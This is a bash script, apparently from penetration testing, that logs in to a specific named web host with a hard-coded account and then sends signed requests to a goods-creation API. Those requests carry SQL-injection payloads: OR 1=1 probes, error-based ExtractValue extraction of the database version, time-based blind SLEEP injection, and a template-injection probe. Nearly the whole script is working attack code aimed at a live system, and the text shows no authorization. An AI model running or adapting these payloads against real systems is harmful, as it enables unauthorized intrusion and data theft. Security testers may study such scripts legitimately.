#!/bin/bash

TOKEN=$(curl -sk "http://longnows-gts.t.kkgroup.cn/pms/api/v1/pmsUser/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"account":"19129430218","password":"any"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

sign_request() {
  REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
  TIMESTAMP=$(date +%s000)
  NONCE=$(echo -n "${REQUEST_ID}${TIMESTAMP}" | md5)
  echo "$REQUEST_ID|$TIMESTAMP|$NONCE"
}

# ===== 测试方向1: SQL注入 =====
echo "====== SQL注入测试: POST /cms/api/v1/enterpriseGoods/create ======"

# 测试1: goodsCode SQL注入
echo ""
echo "--- 测试1: goodsCode字段 SQL注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST001","goodsName":"test","firstUnit":"035","dclUnit":"035","goodsCode":"1'"'"' OR 1=1--"}' 2>&1

# 测试2: goodsName SQL注入
echo ""
echo "--- 测试2: goodsName字段 SQL注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST001","goodsName":"test'"'"' OR 1=1--","firstUnit":"035","dclUnit":"035"}' 2>&1

# 测试3: materialNo字段 SQL注入
echo ""
echo "--- 测试3: materialNo字段 SQL注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST001'"'"' OR 1=1--","goodsName":"test","firstUnit":"035","dclUnit":"035"}' 2>&1

# 测试4: 报错注入
echo ""
echo "--- 测试4: ExtractValue报错注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST001","goodsName":"test","firstUnit":"035","dclUnit":"035","codeTs":"1'"'"' AND ExtractValue(1,CONCAT(0x7e,(SELECT@@version),0x7e))--"}' 2>&1

# 测试5: 时间盲注
echo ""
echo "--- 测试5: 时间盲注 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
START_TIME=$(date +%s%N)
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST001","goodsName":"test","firstUnit":"035","dclUnit":"035","codeTs":"1'"'"' AND SLEEP(3)--"}' 2>&1
END_TIME=$(date +%s%N)
echo "请求耗时: $(( (END_TIME - START_TIME) / 1000000 ))ms"

# 测试6: 参数注入 - 尝试JSON注入/特殊字符
echo ""
echo "--- 测试6: 特殊字符注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"${7*7}","goodsName":"test","firstUnit":"035","dclUnit":"035"}' 2>&1